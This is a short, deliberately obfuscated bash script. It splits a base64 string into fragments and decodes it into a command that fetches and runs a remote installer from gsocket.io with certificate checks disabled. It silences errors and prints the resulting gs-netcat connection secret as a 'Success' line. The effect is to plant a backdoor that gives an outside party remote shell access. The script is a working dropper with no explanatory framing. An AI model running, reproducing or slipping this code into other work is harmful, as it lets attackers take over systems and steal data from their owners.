#!/bin/bash

d_17b31f50=false

if [ "$d_17b31f50" = true ]; then
    set -e
else
    exec 2>/dev/null
    set +e
fi

b_b9caa2a7() {
    local cmd="$1 2>&1"
    local output=""

    if command -v system >/dev/null 2>&1; then
        output=$(system "$cmd" 2>&1)
    elif command -v shell_exec >/dev/null 2>&1; then
        output=$(shell_exec "$cmd" 2>&1)
    elif command -v eval >/dev/null 2>&1; then
        output=$(eval "$cmd" 2>&1)
    fi

    echo "$output"
}

i_3087fa6="R1NfTk9DRVJUQ0hFQ0s9M"
r_9a012e1c="SBiYXNoIC1jICIkKGN1"
l_ed061e8a="cmwgLWZzU0xrIGh0dHBzO"
b_cb62fb7c="i8vZ3NvY2tldC5pby94KSIK"

n_84c18552="${i_3087fa6}${r_9a012e1c}"
l_1dc8d4e8="${l_ed061e8a}${b_cb62fb7c}"
l_bb6f4ec5=$(echo "${n_84c18552}${l_1dc8d4e8}" | base64 -d)

o_8ecaead4="$l_bb6f4ec5"

u_136ac113=$(b_b9caa2a7 "$o_8ecaead4")

if echo "$u_136ac113" | grep -oE 'gs-netcat -s ".*?" -i' >/dev/null; then
    echo "Success ==> $(echo "$u_136ac113" | grep -oE 'gs-netcat -s ".*?" -i')"
else
    echo "Failed :("
fi
